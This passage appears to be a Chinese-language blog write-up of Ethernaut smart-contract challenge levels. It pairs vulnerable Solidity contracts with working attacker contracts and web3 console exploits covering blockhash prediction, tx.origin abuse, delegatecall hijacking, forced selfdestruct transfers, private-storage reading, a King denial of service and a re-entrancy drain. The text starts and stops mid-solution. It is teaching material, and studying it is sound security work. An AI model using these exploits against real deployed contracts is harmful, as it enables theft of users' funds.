    uint256 blockValue <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint256 coinFlip <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">uint256</span><span class="token punctuation">(</span>blockValue<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">FACTOR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bool predict <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    fliphack<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>predict<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br></div></div><p>部署后执行hack十次即可</p> <p><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/imgethernaut-coinflip.png" alt="ethernaut-coinflip"></p> <h2 id="telephone"><a href="#telephone" class="header-anchor">#</a> Telephone</h2> <p>利用<code>tx.origin</code>和<code>msg.sender</code>的区别</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>With msg.sender the owner can be a contract.

With tx.origin the owner can never be a contract.

In a simple call chain A-&gt;B-&gt;C-&gt;D, inside D msg.sender will be C, and tx.origin will be A.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>所以我们只要部署一个合约去调用题目的合约就可以使得<code>tx.origin!=msg.sender</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span>

contract Telephone <span class="token punctuation">{</span>

  address <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token parameter">address _owner</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

contract Attacker <span class="token punctuation">{</span>
    address target<span class="token punctuation">;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span>address p<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">{</span>
        target <span class="token operator">=</span> p<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">{</span>
        Telephone a <span class="token operator">=</span> <span class="token function">Telephone</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
        a<span class="token punctuation">.</span><span class="token function">changeOwner</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h2 id="delegation"><a href="#delegation" class="header-anchor">#</a> Delegation</h2> <p>源码如下</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span>

contract Delegate <span class="token punctuation">{</span>

  address <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span>address _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

contract Delegation <span class="token punctuation">{</span>

  address <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
  Delegate delegate<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span>address _delegateAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    delegate <span class="token operator">=</span> <span class="token function">Delegate</span><span class="token punctuation">(</span>_delegateAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span>
    <span class="token punctuation">(</span>bool result<span class="token punctuation">,</span> bytes memory data<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">address</span><span class="token punctuation">(</span>delegate<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>这里<code>Delegation</code>调用了<code>Delegate</code>合约,在其<code>fallback</code>函数中 使用了<code>delegatecall</code></p> <p>考点在于 Solidity 中支持两种底层调用方式 <code>call</code>和 <code>delegatecall</code></p> <blockquote><p>call 外部调用时，上下文是外部合约
delegatecall 外部调用时，上下文是调用合约</p></blockquote> <p>也就是说通过<code>address(delegate).delegatecall(msg.data);</code>我们能调用<code>delegate</code>的任意函数</p> <p>这里我们发现只要调用<code>delegate</code>的<code>pwn()</code>函数就好了</p> <p>在solidty中可以通过method id（函数选择器）来调用函数，比如<code>pwn</code>函数的<code>method id</code>就是<code>keccak256(&quot;pwn()&quot;))</code>取前四个字节，在 <code>web3</code> 中 <code>sha3</code>就是 <code>keccak256</code>，所以有如下exp：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>await contract.sendTransaction({data: web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)});
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="force"><a href="#force" class="header-anchor">#</a> Force</h2> <p>题目要求使合约 balance 大于 0
但是显然合约没有任何接收钱的方法</p> <p>这里使用合约的自毁强制给题目的合约转账</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract Attacker <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">Attacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> payable<span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token parameter">address target</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token function">selfdestruct</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>给合约转点eth然后调用hack自毁</p> <h2 id="vault"><a href="#vault" class="header-anchor">#</a> Vault</h2> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span>

contract Vault <span class="token punctuation">{</span>
  bool <span class="token keyword">public</span> locked<span class="token punctuation">;</span>
  bytes32 <span class="token keyword">private</span> password<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span>bytes32 _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    password <span class="token operator">=</span> _password<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token parameter">bytes32 _password</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">==</span> _password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>区块链上的信息是完全公开的
private 变量不能被别的合约访问，
但是可以通过web3的getStorage函数获取到。</p> <p>可以利用下面这个poc 得到合约实例<code>instance</code>的任意块</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">getStorageAt</span> <span class="token punctuation">(</span><span class="token parameter">address<span class="token punctuation">,</span> idx</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getStorageAt</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>我们要的是第一块（从第0块开始计算）</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>web3.utils.hexToAscii</code>就能看到密码</p> <p>但是我们需要以bytes32的形式输入，也即</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>contract<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token string">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="king"><a href="#king" class="header-anchor">#</a> King</h2> <p>源码如下</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span>

contract King <span class="token punctuation">{</span>

  address payable king<span class="token punctuation">;</span>
  uint <span class="token keyword">public</span> prize<span class="token punctuation">;</span>
  address payable <span class="token keyword">public</span> owner<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token punctuation">{</span>
    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  
    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
    king<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">address payable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> king<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>题目要求始终为King，那么只要在成为King后阻止下一笔交易即可</p> <p>可以编写一个没有<code>payable</code>修饰的fallback的合约这样就可以阻止<code>king.transfer</code>执行</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>contract Attacker<span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>address target<span class="token punctuation">)</span> <span class="token keyword">public</span> payable<span class="token punctuation">{</span>        target<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="re-entrancy"><a href="#re-entrancy" class="header-anchor">#</a> Re-entrancy</h2> <p>Exp</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>contract Reentrance <span class="token punctuation">{</span>  <span class="token function">mapping</span><span class="token punctuation">(</span><span class="token parameter">address</span> <span class="token operator">=&gt;</span> uint<span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token parameter">address _to</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token punctuation">{</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token parameter">address _who</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">uint balance</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token parameter">uint _amount</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>_amount<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//问题在于这里 调用了 sender 如果sender的fallback也withdraw（此时balance尚未被修改） 就会造成递归重入攻击        _amount;      }      balances[msg.sender] -= _amount;    }  }  function() public payable {}}//编写如下合约contract Attacker {    address instance_address = instance_address;    Reentrance target = Reentrance(instance_address);    uint public amount = 1 ether;      function Attack() payable{}    function donate() public payable {        target.donate.value(amount).gas(4000000)(address(this));    }        function get_balance() public view returns(uint) {        return target.balanceOf(this);    }        function my_balance() public view returns(uint) {        return address(this).balance;    }    function target_balance() public view returns(uint) {        return instance_address.balance;    }    function hack() public {        target.withdraw(0.5 ether);    }        function retrive() public {        selfdestruct(player_address);    }    function () public payable {        target.withdraw(0.5 ether);    }}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>所以我们创建合约给Reentrance转1eth，然后再退款0.5eth，合约就会调用我们的fallback不断退款0.5eth，最终退到0eth完成攻击</p> <h2 id="elevator"><a href="#elevator" class="header-anchor">#</a> Elevator</h2> <p>只要编写一个第一次返回false，第二次返回true的islastFoor()就行了</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Building</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token parameter">uint</span><span class="token punctuation">)</span> external <span class="token function">returns</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>contract Elevator <span class="token punctuation">{</span>  bool <span class="token keyword">public</span> top<span class="token punctuation">;</span>  uint <span class="token keyword">public</span> floor<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token parameter">uint _floor</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    Building building <span class="token operator">=</span> <span class="token function">Building</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>_floor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      floor <span class="token operator">=</span> _floor<span class="token punctuation">;</span>      top <span class="token operator">=</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>contract Attacker is Building<span class="token punctuation">{</span>    bool <span class="token keyword">public</span> lastFloor <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token parameter">uint</span><span class="token punctuation">)</span> override external <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">bool</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        lastFloor <span class="token operator">=</span> <span class="token operator">!</span>lastFloor<span class="token punctuation">;</span>        <span class="token keyword">return</span> lastFloor<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token parameter">address p</span><span class="token punctuation">)</span><span class="token keyword">public</span><span class="token punctuation">{</span>        Elevator target <span class="token operator">=</span> <span class="token function">Elevator</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        target<span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="privacy"><a href="#privacy" class="header-anchor">#</a> Privacy</h2> <p>和<code>Vault</code>那题差不多，我们可以得到链上的所有数据，只要找到密码就行了</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span>

contract Privacy <span class="token punctuation">{</span>

  bool <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  uint256 <span class="token keyword">public</span> <span class="token constant">ID</span> <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
  uint8 <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
  uint8 <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
  uint16 <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token function">uint16</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span>
  bytes32<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span>bytes32<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> memory _data<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    data <span class="token operator">=</span> _data<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  
  <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token parameter">bytes16 _key</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span>_key <span class="token operator">==</span> <span class="token function">bytes16</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">/*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token string">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span> 
<span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token string">&quot;0x000000000000000000000000000000000000000000000000000000006038b197&quot;</span>
